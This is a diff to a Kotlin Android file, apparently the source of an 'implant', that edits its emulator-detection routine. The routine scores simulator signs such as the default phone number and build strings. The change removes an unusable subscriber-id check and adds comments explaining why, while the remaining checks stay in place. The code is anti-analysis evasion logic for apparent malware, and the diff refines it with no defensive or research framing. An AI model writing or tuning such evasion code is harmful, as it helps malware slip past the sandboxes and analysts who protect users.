@@ -34,7 +34,15 @@ object Lab {
     /** The number the android simulator gives to every installation. */
     const val SIMULATOR_NUMBER = "15555215554"
 
-    /** The subscriber id of the simulator. */
+    /**
+     * The subscriber id of the simulator.
+     *
+     * Kept as the record of what the id looks like.  The implant does not
+     * read the subscriber id: that needs READ_PRIVILEGED_PHONE_STATE, which
+     * a user-installed application never holds, and a test of "is this the
+     * simulator's id" against a value that can never be read is a test of
+     * nothing.  The build strings and the number above carry the check.
+     */
     const val SIMULATOR_SUBSCRIBER = "310260000000000"
 
     /**
@@ -220,23 +228,16 @@ object Lab {
                 // The radio refused: the same answer, for another reason.
                 null
             }
-            val subscriber: String? = try {
-                telephony.subscriberId
-            } catch (e: SecurityException) {
-                // READ_PRIVILEGED_PHONE_STATE is a system permission, so this
-                // is the answer on every phone that is not rooted.
-                null
-            } catch (t: Exception) {
-                null
-            }
+            // getSubscriberId needs READ_PRIVILEGED_PHONE_STATE, which is
+            // signature|privileged: no application that a user installs can
+            // hold it, so the call would only ever throw.  It is not made,
+            // and the answer is the one it always produced -- unknown.  The
+            // identifiers of a simulator are still caught by the number
+            // above and by the build strings further down.
             sensors["line1"] = number ?: "unknown"
-            sensors["subscriber"] = subscriber ?: "unknown"
+            sensors["subscriber"] = "unknown"
             if (number == SIMULATOR_NUMBER) {
                 reasons.add("the number of the phone is the number of the simulator")
-                score += 3
-            }
-            if (subscriber == SIMULATOR_SUBSCRIBER) {
-                reasons.add("the subscriber id is the id of the simulator")
                 score += 3
             }
             val phoneType = try {
